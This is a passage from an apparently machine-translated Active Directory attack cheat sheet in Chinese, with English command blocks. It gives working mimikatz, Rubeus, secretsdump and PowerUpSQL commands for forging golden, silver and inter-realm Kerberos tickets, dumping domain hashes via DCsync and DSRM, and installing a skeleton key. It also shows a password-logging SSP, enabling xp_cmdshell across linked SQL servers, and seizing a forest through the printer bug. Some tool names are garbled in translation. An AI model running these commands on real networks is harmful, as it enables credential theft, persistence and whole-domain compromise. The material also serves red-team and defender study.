lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys" rel="noopener ugc nofollow" target="_blank">CVE-2020–0688</a></li><li id="d17c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/dirkjanm/PrivExchange" rel="noopener ugc nofollow" target="_blank"> PrivExchange </a>滥用Exchange，用你的权限换取域管理员权限</li></ul><h1 id="1d25" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">武器化打印机Bug</h1><ul class=""><li id="f4ed" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/" rel="noopener ugc nofollow" target="_blank">打印机服务器对域管理员的Bug</a></li><li id="8fa1" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/NotMedic/NetNTLMtoSilverTicket" rel="noopener ugc nofollow" target="_blank"> NetNTLMtoSilverTicket </a></li></ul><h1 id="8e75" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">滥用ACL</h1><ul class=""><li id="8d94" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" rel="noopener ugc nofollow" target="_blank">使用Active Directory中的ACL提升权限</a></li><li id="33b9" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/fox-it/aclpwn.py" rel="noopener ugc nofollow" target="_blank"> aclpwn.py </a></li><li id="389a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/fox-it/Invoke-ACLPwn" rel="noopener ugc nofollow" target="_blank">调用-ACLPwn </a></li></ul><h1 id="34fd" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">使用mitm6滥用IPv6</h1><ul class=""><li id="f62b" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" rel="noopener ugc nofollow" target="_blank">通过IPv6危及IPv4网络</a></li><li id="6902" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">mitm6 </li></ul><h1 id="0768" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">SID历史滥用</h1><p id="b54f" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">WUT是迪斯？:如果我们设法破坏了森林的子域，并且没有启用 <a class="ae mj" href="https://www.itprotoday.com/windows-8/sid-filtering" rel="noopener ugc nofollow" target="_blank"> <em class="of"> SID过滤</em> </a> <em class="of">(大多数情况下没有启用)，我们可以滥用它的权限，将其升级为森林的根域的域管理员。这是可能的，因为kerberos TGT票据上的</em> <a class="ae mj" href="https://www.itprotoday.com/windows-8/sid-history" rel="noopener ugc nofollow" target="_blank"> <em class="of"> SID历史</em> </a> <em class="of">字段定义了“额外的”安全组和特权。</em></p><p id="b4bc" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">利用示例:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="b1f5" class="nl kw iq my b gy nm nn l no np">#Get the SID of the Current Domain using PowerView<br/>Get-DomainSID -Domain current.root.domain.local</span><span id="641c" class="nl kw iq my b gy nq nn l no np">#Get the SID of the Root Domain using PowerView<br/>Get-DomainSID -Domain root.domain.local</span><span id="b6ef" class="nl kw iq my b gy nq nn l no np">#Create the Enteprise Admins SID<br/>Format: RootDomainSID-519</span><span id="a6a4" class="nl kw iq my b gy nq nn l no np">#Forge "Extra" Golden Ticket using mimikatz<br/>kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:&lt;CurrentDomainSID&gt; /krbtgt:&lt;krbtgtHash&gt; /sids:&lt;EnterpriseAdminsSID&gt; /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi</span><span id="c203" class="nl kw iq my b gy nq nn l no np">#Inject the ticket into memory<br/>kerberos::ptt \path\to\ticket\golden.kirbi</span><span id="b16e" class="nl kw iq my b gy nq nn l no np">#List the DC of the Root Domain<br/>dir \\dc.root.domain.local\C$</span><span id="1ec0" class="nl kw iq my b gy nq nn l no np">#Or DCsync and dump the hashes using mimikatz<br/>lsadump::dcsync /domain:root.domain.local /all</span></pre><p id="222e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">详细文章:</p><ul class=""><li id="8d56" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://adsecurity.org/?p=1640" rel="noopener ugc nofollow" target="_blank"> Kerberos金券现在更加金色了</a></li><li id="597e" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/" rel="noopener ugc nofollow" target="_blank">攻击域信任的指南</a></li></ul><h1 id="53c5" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">利用SharePoint</h1><ul class=""><li id="1cf8" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d" rel="noopener">CVE-2019–0604</a>RCE开采<br/>T21【PoC】</li><li id="71aa" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization" rel="noopener ugc nofollow" target="_blank">CVE-2019–1257</a>通过BDC反序列化执行代码</li><li id="dbe5" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters" rel="noopener ugc nofollow" target="_blank">CVE-2020–0932</a>RCE使用类型转换器<br/> <a class="ae mj" href="https://github.com/thezdi/PoC/tree/master/CVE-2020-0932" rel="noopener ugc nofollow" target="_blank">概念验证</a></li></ul><h1 id="5223" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">Zerologon</h1><ul class=""><li id="b67c" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.secura.com/whitepapers/zerologon-whitepaper" rel="noopener ugc nofollow" target="_blank"> Zerologon:未经认证的域控制器危害</a>:漏洞白皮书。</li><li id="6f0a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon" rel="noopener ugc nofollow" target="_blank">sharp zero logon</a>:zero logon漏洞利用的C#实现。</li><li id="68c5" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/BC-SECURITY/Invoke-ZeroLogon" rel="noopener ugc nofollow" target="_blank">Invoke-zero logon</a>:zero logon漏洞利用的Powershell实现。</li><li id="a2a0" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">使用impacket库的Zerologon漏洞利用的Python实现。</li></ul><h1 id="2063" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">印刷噩梦</h1><ul class=""><li id="2bdc" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527" rel="noopener ugc nofollow" target="_blank">CVE-2021–34527</a>:漏洞详情。</li><li id="e38c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/cube0x0/CVE-2021-1675" rel="noopener ugc nofollow" target="_blank">PrintNightmare的impacket实现</a>:使用Impacket库的print nightmare的可靠PoC。</li><li id="7700" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare" rel="noopener ugc nofollow" target="_blank">CVE-2021–1675</a>的C#实现:用C#写的PrintNightmare的可靠PoC。</li></ul><h1 id="5cbc" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">领域持久性</h1><h1 id="a14b" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">金票攻击</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="73c4" class="nl kw iq my b gy nm nn l no np">#Execute mimikatz on DC as DA to grab krbtgt hash:<br/>Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName &lt;DC'sName&gt;</span><span id="bbcb" class="nl kw iq my b gy nq nn l no np">#On any machine:<br/>Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain's SID&gt; /krbtgt:<br/>&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span></pre><h1 id="b06c" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">DCsync攻击</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1ec5" class="nl kw iq my b gy nm nn l no np">#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):<br/>Invoke-Mimikatz -Command '"lsadump::dcsync /user:&lt;DomainName&gt;\&lt;AnyDomainUser&gt;"'</span><span id="954e" class="nl kw iq my b gy nq nn l no np">#DCsync using secretsdump.py from impacket with NTLM authentication<br/>secretsdump.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;DC'S IP or FQDN&gt; -just-dc-ntlm</span><span id="822a" class="nl kw iq my b gy nq nn l no np">#DCsync using secretsdump.py from impacket with Kerberos Authentication<br/>secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC'S IP or FQDN&gt; -just-dc-ntlm</span></pre><p id="dd71" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">提示:<br/> /ptt - &gt;在当前运行的会话中注入票证<br/> /ticket - &gt;将票证保存在系统中以备后用</p><h1 id="9546" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">银票攻击</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="4958" class="nl kw iq my b gy nm nn l no np">Invoke-Mimikatz -Command '"kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:<br/>&lt;ServiceType&gt; /rc4:&lt;TheSPN's Account NTLM Hash&gt; /user:&lt;UserToImpersonate&gt; /ptt"'</span></pre><p id="3efe" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><a class="ae mj" href="https://adsecurity.org/?page_id=183" rel="noopener ugc nofollow" target="_blank"> SPN列表</a></p><h1 id="b374" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">万能钥匙攻击</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1103" class="nl kw iq my b gy nm nn l no np">#Exploitation Command runned as DA:<br/>Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName &lt;DC's FQDN&gt;</span><span id="3899" class="nl kw iq my b gy nq nn l no np">#Access using the password "mimikatz"<br/>Enter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\Administrator</span></pre><h1 id="0880" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">DSRM滥用</h1><p id="01b5" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:每个DC都有一个本地管理员帐户，该帐户具有DSRM密码，即SafeBackupPassword。我们可以得到它，然后pth它的NTLM散列来让本地管理员访问DC！</em></p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="3999" class="nl kw iq my b gy nm nn l no np">#Dump DSRM password (needs DA privs):<br/>Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName &lt;DC's Name&gt;</span><span id="f5a4" class="nl kw iq my b gy nq nn l no np">#This is a local account, so we can PTH and authenticate!<br/>#BUT we need to alter the behaviour of the DSRM account before pth:<br/>#Connect on DC:<br/>Enter-PSSession -ComputerName &lt;DC's Name&gt;</span><span id="6ce6" class="nl kw iq my b gy nq nn l no np">#Alter the Logon behaviour on registry:<br/>New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose</span><span id="5a87" class="nl kw iq my b gy nq nn l no np">#If the property already exists:<br/>Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose</span></pre><p id="6d54" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">然后只需PTH获得DC的本地管理权限！</p><h1 id="5022" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">自定义SSP</h1><p id="f274" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:我们可以在SSP上设置一个自定义dll，例如mimikatz的mimilib.dll，它将监视并捕获登录用户的明文密码！</em></p><p id="1800" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">来自powershell:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="5d8a" class="nl kw iq my b gy nm nn l no np">#Get current Security Package:<br/>$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'</span><span id="6629" class="nl kw iq my b gy nq nn l no np">#Append mimilib:<br/>$packages += "mimilib"</span><span id="1ff2" class="nl kw iq my b gy nq nn l no np">#Change the new packages name<br/>Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages<br/>Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages</span><span id="91e2" class="nl kw iq my b gy nq nn l no np">#ALTERNATIVE:<br/>Invoke-Mimikatz -Command '"misc::memssp"'</span></pre><p id="c06f" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">现在DC上的所有登录都记录到-&gt; C:\ Windows \ System32 \ kiwissp . log</p><h1 id="fc94" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">跨林攻击</h1><h1 id="6001" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">信任票</h1><p id="adc8" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:如果我们在与另一个林有双向信任关系的域上拥有域管理员权限，我们就可以获得信任密钥并伪造我们自己的跨领域TGT。</em></p><p id="9d61" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">⚠️:我们的访问权限将仅限于我们的DA帐户在另一个林中的配置权限！</p><p id="513e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">使用Mimikatz:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="b0fd" class="nl kw iq my b gy nm nn l no np">#Dump the trust key<br/>Invoke-Mimikatz -Command '"lsadump::trust /patch"'<br/>Invoke-Mimikatz -Command '"lsadump::lsa /patch"'</span><span id="7810" class="nl kw iq my b gy nq nn l no np">#Forge an inter-realm TGT using the Golden Ticket attack<br/>Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:  <br/>&lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:<br/>&lt;PathToSaveTheGoldenTicket&gt;"'</span></pre><p id="b126" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">-&gt;❗门票。kirbi格式</p><p id="f40e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">然后使用跨域TGT向外部森林请求TGS以获得任何服务，并访问资源！</p><p id="e0ca" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">使用红色:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="6907" class="nl kw iq my b gy nm nn l no np">.\Rubeus.exe asktgs /ticket:&lt;kirbi file&gt; /service:"Service's SPN" /ptt</span></pre><h1 id="55b2" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">滥用MSSQL服务器</h1><ul class=""><li id="23a1" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated">枚举MSSQL实例:<code class="fe mv mw mx my b">Get-SQLInstanceDomain</code></li><li id="f85b" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">作为当前用户检查可访问性:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="f939" class="nl kw iq my b gy nm nn l no np">Get-SQLConnectionTestThreaded<br/>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose</span></pre><ul class=""><li id="3730" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">收集关于实例的信息:<code class="fe mv mw mx my b">Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></li><li id="3383" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">滥用SQL数据库链接:<br/> <em class="of"> WUT是DIS？:数据库链接允许SQL Server像访问其他SQL Server一样访问其他资源。如果我们有两个链接的SQL服务器，我们可以在其中执行存储过程。数据库链接也适用于森林信任！</em></li></ul><p id="0481" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">检查现有的数据库链接:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="7fa9" class="nl kw iq my b gy nm nn l no np">#Check for existing Database Links:<br/>#PowerUpSQL:<br/>Get-SQLServerLink -Instace &lt;SPN&gt; -Verbose<br/>     <br/>#MSSQL Query:<br/>select * from master..sysservers</span></pre><p id="3d4e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">然后，我们可以使用查询来枚举链接数据库中的其他链接:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1316" class="nl kw iq my b gy nm nn l no np">#Manualy:<br/>select * from openquery("LinkedDatabase", 'select * from master..sysservers')<br/>     <br/>#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):<br/>Get-SQLServerLinkCrawl -Instance &lt;SPN&gt; -Verbose<br/>     <br/>#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell<br/>#Or if it is disabled enable it:<br/>EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"</span></pre><p id="1c31" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">查询执行:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="2929" class="nl kw iq my b gy nm nn l no np">Get-SQLServerLinkCrawl -Instace &lt;SPN&gt; -Query "exec master..xp_cmdshell 'whoami'"</span></pre><h1 id="58c4" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">打破森林信任</h1><p id="62e2" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:<br/>TL；<br/>如果我们与一个外部森林有双向信任，并且我们设法危及本地森林上一台启用了无约束委派的机器(DC默认有这个功能)，我们可以使用printerbug强制外部森林根域的DC向我们认证。然后，我们可以捕获它的TGT，将其注入内存，并通过DCsync转储它的哈希值，这样我们就可以完全访问整个森林。</em></p><p id="c820" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">我们将使用的工具:</p><ul class=""><li id="50d6" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/GhostPack/Rubeus" rel="noopener ugc nofollow" target="_blank">风疹</a></li><li id="5676" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/leechristensen/SpoolSample" rel="noopener ugc nofollow" target="_blank"> SpoolSample </a></li><li id="8843" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/gentilkiwi/mimikatz" rel="noopener ugc nofollow" target="_blank">米米卡兹</a></li></ul><p id="5ca9" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">利用示例:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="44e9" class="nl kw iq my b gy nm nn l no np">#Start monitoring for TGTs with rubeus:<br/>Rubeus.exe monitor /interval:5 /filteruser:target-dc$</span><span id="1592" class="nl kw iq my b gy nq nn l no np">#Execute the printerbug to trigger the force authentication of the target DC to our machine<br/>SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local</span><span id="f214" class="nl kw iq my b gy nq nn l no np">#Get the base64 captured TGT from Rubeus and inject it into memory:<br/>Rubeus.exe ptt /ticket:&lt;Base64ValueofCapturedTicket&gt;</span><span id="ed8c" class="nl kw iq my b gy nq nn l no np">#Dump the hashes of the target domain using mimikatz:<br/>lsadump::dcsync /domain:external.forest.local /all</span></pre></div></div>    
</body>
</html>